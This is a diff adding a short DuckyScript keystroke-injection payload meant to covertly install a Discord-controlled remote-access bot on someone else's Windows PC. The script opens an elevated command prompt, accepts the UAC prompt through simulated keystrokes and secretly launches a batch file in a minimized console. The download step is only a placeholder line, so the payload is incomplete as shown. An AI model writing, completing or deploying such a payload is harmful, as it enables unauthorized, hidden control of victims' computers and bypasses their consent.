@@ -1,0 +1,26 @@
+REM TITLE 3XAYRemoteAccess
+REM AUTHOR 3XAY
+REM DESCRIPTION This script will download and setup my Discord PC Controller bot to enable someone (like me) to remotely control other computers via Discord
+DEFAULT_DELAY 100
+
+REM Open CMD in Admin mode
+GUI r
+DELAY 250
+STRING cmd
+CTRL-SHIFT ENTER
+
+REM Grant Admin access
+LEFTARROW
+ENTER
+
+REM Download install script
+STRING this is supposed to be a download command
+ENTER
+
+REM Secretly start downloaded script in a new, minimized console
+STRING start /MIN batch.bat
+ENTER
+
+REM Close the original "downloader" console
+STRING exit
+ENTER
